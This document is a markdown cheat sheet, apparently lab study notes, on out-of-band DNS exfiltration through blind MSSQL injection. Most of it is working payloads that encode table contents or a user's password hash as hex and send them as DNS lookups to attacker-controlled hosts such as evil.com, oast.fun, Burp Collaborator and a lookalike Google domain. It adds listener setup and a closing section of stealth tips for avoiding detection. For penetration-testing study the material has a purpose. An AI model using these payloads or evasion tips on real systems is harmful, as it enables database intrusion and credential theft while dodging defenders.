# 🌐 Out-of-Band DNS Exfiltration

## Theory

DNS exfiltration = target server sends DNS request to attacker-controlled domain with data encoded as subdomain.

**Example**: Extract `secret` → Server queries `736563726574.evil.com`

### Why Use OOB DNS?

| Time-based SQLi | OOB DNS |
|-----------------|---------|
| Very slow | Fast (1 request) |
| Inaccurate (network issues) | Reliable |
| Sometimes impossible | Works when time-based fails |

> ⚠️ Always test for DNS exfiltration - you may miss blind vulnerabilities otherwise!

---

## MSSQL DNS Exfiltration Techniques

All require different permissions. Replace `SELECT 1234` with your query and `YOUR.DOMAIN` with your domain.

| Function | Query |
|----------|-------|
| **xp_dirtree** | `DECLARE @T varchar(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_dirtree "\\'+@T+'.YOUR.DOMAIN\\x"');` |
| **xp_fileexist** | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_fileexist "\\'+@T+'.YOUR.DOMAIN\\x"');` |
| **xp_subdirs** | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);EXEC('master..xp_subdirs "\\'+@T+'.YOUR.DOMAIN\\x"');` |
| **dm_os_file_exists** | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM sys.dm_os_file_exists('\\'+@T+'.YOUR.DOMAIN\x');` |
| **fn_trace_gettable** | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM fn_trace_gettable('\\'+@T+'.YOUR.DOMAIN\x.trc',DEFAULT);` |
| **fn_get_audit_file** | `DECLARE @T VARCHAR(1024);SELECT @T=(SELECT 1234);SELECT * FROM fn_get_audit_file('\\'+@T+'.YOUR.DOMAIN\',DEFAULT,DEFAULT);` |

---

## DNS Limitations

### Character Restrictions

- Only **letters and numbers** allowed in domain names
- Labels (between dots) max **63 characters**
- Total domain max **253 characters**

### Solution: Encode and Split

```sql
DECLARE @T VARCHAR(MAX); 
DECLARE @A VARCHAR(63); 
DECLARE @B VARCHAR(63); 
SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), flag), 1) FROM flag; 
SELECT @A=SUBSTRING(@T,3,63); 
SELECT @B=SUBSTRING(@T,3+63,63);
```

This:
1. Converts data to hex (`VARBINARY` → hex string)
2. Splits into @A (first 63 chars) and @B (next 63 chars)

### Complete Payload

```sql
DECLARE @T VARCHAR(MAX); 
DECLARE @A VARCHAR(63); 
DECLARE @B VARCHAR(63); 
SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), flag), 1) FROM flag; 
SELECT @A=SUBSTRING(@T,3,63); 
SELECT @B=SUBSTRING(@T,3+63,63); 
SELECT * FROM fn_get_audit_file('\\'+@A+'.'+@B+'.YOUR.DOMAIN\',DEFAULT,DEFAULT);
```

---

## Tool 1: Interactsh

### Web Interface

1. Visit https://app.interactsh.com
2. Wait for domain to generate
3. Copy domain to clipboard

### Payload Example

```sql
';DECLARE @T VARCHAR(MAX);
DECLARE @A VARCHAR(63);
DECLARE @B VARCHAR(63);
SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), flag), 1) FROM flag;
SELECT @A=SUBSTRING(@T,3,63);
SELECT @B=SUBSTRING(@T,3+63,63);
EXEC('master..xp_subdirs "\\'+@A+'.'+@B+'.cegs9f52vtc0000z2jt0g8ecwzwyyyyyb.oast.fun\x"');--
```

### CLI Version

```bash
./interactsh-client

[INF] Listing 1 payload for OOB Testing
[INF] cegpcd2um5n3opvt0u30yep71yuz9as8k.oast.online

# DNS interactions will appear here
[cegpcd2um5n3opvt0u30yep71yuz9as8k] Received DNS interaction (A) from...
```

---

## Tool 2: Burp Collaborator

### Setup

1. **Burp** → **Burp Collaborator Client**
2. Click **Copy to clipboard**

### Payload (Two Requests)

Burp Collaborator doesn't allow `@A.@B.domain`, so send separately:

```sql
';DECLARE @T VARCHAR(MAX);
DECLARE @A VARCHAR(63);
DECLARE @B VARCHAR(63);
SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), flag), 1) FROM flag;
SELECT @A=SUBSTRING(@T,3,63);
SELECT @B=SUBSTRING(@T,3+63,63);
EXEC('master..xp_subdirs "\\'+@A+'.xxx.burpcollaborator.net\x"');
EXEC('master..xp_subdirs "\\'+@B+'.xxx.burpcollaborator.net\x"');--
```

---

## Tool 3: Custom DNS Server

### Using Technitium DNS

1. Access dashboard on port **5380** (admin:admin)
2. **Zones** → **Add Zone**
3. Enter domain name, select **Primary Zone**
4. Add **A record**:
   - Name: `@` (wildcard)
   - Type: `A`
   - IP: Your attack machine IP

### Check Logs

**Logs** → **Query Logs** → **Query**

---

## Practical Example

### Step 1: Test Payload

```sql
maria';DECLARE @T VARCHAR(1024); 
SELECT @T=(SELECT 1234); 
SELECT * FROM fn_trace_gettable('\\'+@T+'.blindsqli.academy.htb\x.trc',DEFAULT);--+-
```

Response: `taken` ✅ (query executed)

Check DNS logs for `1234.blindsqli.academy.htb`

### Step 2: Extract Password Hash

```sql
maria';DECLARE @T VARCHAR(MAX); 
DECLARE @A VARCHAR(63); 
DECLARE @B VARCHAR(63); 
SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), password), 1) 
  FROM users WHERE username='maria'; 
SELECT @A=SUBSTRING(@T,3,63); 
SELECT @B=SUBSTRING(@T,3+63,63); 
SELECT * FROM fn_trace_gettable('\\'+@A+'.'+@B+'.blindsqli.academy.htb\x.trc',DEFAULT);--+-
```

### Step 3: Decode Result

DNS log shows: `243279313024...`

Decode from hex → Password hash!

---

## URL Encoded Payload

For web injection, URL encode the payload:

**Original**:
```sql
maria';DECLARE @T VARCHAR(MAX); DECLARE @A VARCHAR(63); DECLARE @B VARCHAR(63); SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), flag), 1) from flag; SELECT @A=SUBSTRING(@T,3,63); SELECT @B=SUBSTRING(@T,3+63,63); SELECT * FROM fn_trace_gettable('\\'+@A+'.'+@B+'.gO0gle.com.my\x.trc',DEFAULT);-- -
```

**URL Encoded**:
```
maria%27%3BDECLARE%20%40T%20VARCHAR%28MAX%29%3B%20DECLARE%20%40A%20VARCHAR%2863%29%3B%20...
```

---

## Decoding Exfiltrated Data

### CyberChef Recipe

1. Remove dots separating subdomains
2. **From Hex** decode

```
Input:  4854427b39343336326165653566363164633332393836306661346336656234633462617d
Output: HTB{...}
```

---

## OOB DNS Beyond SQLi

Works with other blind vulnerabilities:
- **Blind XXE** (XML External Entity)
- **Blind Command Injection**
- **Blind SSRF**

---

## Quick Reference

### MSSQL Functions

| Function | Permissions Needed |
|----------|-------------------|
| `xp_dirtree` | Low |
| `xp_fileexist` | Low |
| `xp_subdirs` | Low |
| `fn_trace_gettable` | Higher |
| `fn_get_audit_file` | Higher |

### Encoding Template

```sql
CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), column), 1)
```

### Splitting Template

```sql
SELECT @A=SUBSTRING(@T,3,63);   -- First 63 chars (skip 0x prefix)
SELECT @B=SUBSTRING(@T,3+63,63); -- Next 63 chars
```

### Tools

| Tool | Platform | Type |
|------|----------|------|
| **Interactsh** | Web/CLI | Free |
| **Burp Collaborator** | Burp Pro | Paid |
| **Custom DNS** | Self-hosted | Free |

---

## Stealth Tips

- Use inconspicuous domain names (e.g., `analytics.company.com`)
- Avoid suspicious patterns that trigger alerts
- Zone names are case-insensitive

